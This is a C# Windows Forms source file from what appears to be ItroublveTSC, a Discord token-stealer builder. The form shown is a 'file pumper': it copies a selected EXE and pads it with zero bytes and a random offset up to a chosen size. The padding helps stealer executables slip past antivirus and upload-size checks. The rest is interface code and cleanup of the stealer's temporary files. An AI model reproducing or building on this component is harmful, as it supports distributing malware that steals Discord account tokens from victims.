using DiscordFlooder.Class.Design.Rainbow;
using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace ItroublveTSC
{
    public partial class FileSize : Form
	{
        #region GUI
        public FileSize()
		{
            InitializeComponent();
            RainbowTimer.Start();
        }

        private void RainbowTimer_Tick(object sender, EventArgs e)
        {
            Rainbow.RainbowEffect();
            pnlRainbowTop.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
            PnlRainbowDown.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("TokenStealerCOPY.bin"))
            {
                File.Delete("TokenStealerCOPY.bin");
            }
            if (Directory.Exists(Path.GetTempPath() + "bin_copy"))
            {
                Directory.Delete(Path.GetTempPath() + "bin_copy", true);
            }
            File.Delete(Path.GetTempPath() + "convertedicon.ico");
            Environment.Exit(0);
        }

        private void HomeBtn_Click(object sender, EventArgs e)
        {
            var frm = Application.OpenForms.OfType<frmMain>().FirstOrDefault();
            if (frm == null)
            {
                frm = new frmMain();
            }
            frm.Show();
            Hide();
        }
        private void gb_file_CheckedChanged(object sender, EventArgs e)
        {
            trackBar1.Update();
            trackBar1.Maximum = 10;
            trackBar1.Update();
            FileSizeCount.Text = Convert.ToString(trackBar1.Value);
        }

        private void mb_file_CheckedChanged(object sender, EventArgs e)
        {
            trackBar1.Update();
            trackBar1.Maximum = 999;
            trackBar1.Update();
            FileSizeCount.Text = Convert.ToString(trackBar1.Value);
        }

        private void kb_file_CheckedChanged(object sender, EventArgs e)
        {
            trackBar1.Update();
            trackBar1.Maximum = 999;
            trackBar1.Update();
            FileSizeCount.Text = Convert.ToString(trackBar1.Value);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void HeadServerLbl_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = MousePosition.X - Location.X;
            Mouse.y = MousePosition.Y - Location.Y;
        }

        private void HeadServerLbl_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                Location = Mouse.newpoint;
            }
        }

        private void HeadLinePnlInf_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = MousePosition.X - Location.X;
            Mouse.y = MousePosition.Y - Location.Y;
        }

        private void HeadLinePnlInf_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                Location = Mouse.newpoint;
            }
        }
        #endregion
        #region Increase size
        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            FileSizeCount.Text = Convert.ToString(trackBar1.Value);
        }

        private void ApplyBtn_Click(object sender, EventArgs e)
        {
            SaveFileDialog file = new SaveFileDialog();
            file.Filter = "EXE File (*.exe) | *.exe";
            if (file.ShowDialog() == DialogResult.OK)
            {
                long FileSize = trackBar1.Value;
                File.Copy(textBox1.Text, file.FileName);

                if (kb_file.Checked)
                {
                    Random sad = new Random();
                    int cri = sad.Next(10, 900);
                    FileSize = FileSize * 1024 + cri;
                }
                if (mb_file.Checked)
                {
                    Random sad = new Random();
                    int cri = sad.Next(10000, 900000);
                    FileSize = FileSize * 1048576 + cri;
                }
                if (gb_file.Checked)
                {
                    Random sad = new Random();
                    int cri = sad.Next(10000, 500000);
                    FileSize = FileSize * 1073741824 + cri;
                }
                FileStream PumpFile = File.OpenWrite(file.FileName);
                long Size = PumpFile.Seek(0, SeekOrigin.End);
                while (Size < FileSize)
                {
                    PumpFile.WriteByte(0);
                    Size += 1;
                }
                if (Size == FileSize)
                {
                    WinInfo.Visible = true;
                    WinInfo.BalloonTipText = "File size increased, new file size: " + Size + " bytes";
                    WinInfo.ShowBalloonTip(1000);
                }
                else
                {
                    MessageBox.Show("You can't decrease a file size!\nEnter a higer amount then the EXEs size!", "ItroublveTSC");
                }
                PumpFile.Close();
            }
        }
        public void Pump(string file)
        {
            long FileSize = trackBar1.Value;
            if (kb_file.Checked)
            {
                Random sad = new Random();
                int cri = sad.Next(10, 900);
                FileSize = FileSize * 1024 + cri;
            }
            if (mb_file.Checked)
            {
                Random sad = new Random();
                int cri = sad.Next(10000, 900000);
                FileSize = FileSize * 1048576 + cri;
            }
            if (gb_file.Checked)
            {
                Random sad = new Random();
                int cri = sad.Next(10000, 500000);
                FileSize = FileSize * 1073741824 + cri;
            }
            FileStream PumpFile = File.OpenWrite(file);
            long Size = PumpFile.Seek(0, SeekOrigin.End);
            while (Size < FileSize)
            {
                PumpFile.WriteByte(0);
                Size += 1;
            }
            PumpFile.Close();
        }

        private void roundBtn1_Click(object sender, EventArgs e)
        {
            OpenFileDialog file = new OpenFileDialog();
            file.Filter = "EXE File (*.exe) | *.exe";
            if (file.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = file.FileName;
            }
        }
        #endregion
    }
}
